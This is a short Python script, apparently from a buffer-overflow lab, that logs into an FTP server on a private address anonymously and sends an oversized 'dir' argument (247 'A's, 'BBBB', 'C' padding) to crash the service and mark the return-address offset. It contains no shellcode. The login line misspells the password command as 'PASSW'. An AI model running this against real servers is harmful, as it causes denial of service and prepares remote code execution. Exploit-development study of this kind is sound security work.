import socket
IP = "192.168.15.4"
PORT = 21

def Fuzzing(bytes, IP, PORT):
    try:
        print("Fuzzing with %s bytes" %len(bytes))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        s.send(b'USER anonymous\r\n')
        s.recv(1024)
        s.send(b'PASSW anonymous@anon.org\r\n')
        s.recv(1024)
        s.send(b'dir ' + bytes + b'\r\n')
        s.close()
    except Exception as e:
        print(e)
        print("Program crash with %s bytes" %len(bytes))
        exit()
bytes = 247 * b"A" + b"BBBB"
bytesC = ( 400 - len(bytes) ) * b"C"
bytesTotal = bytes + bytesC
Fuzzing(bytesTotal, IP, PORT)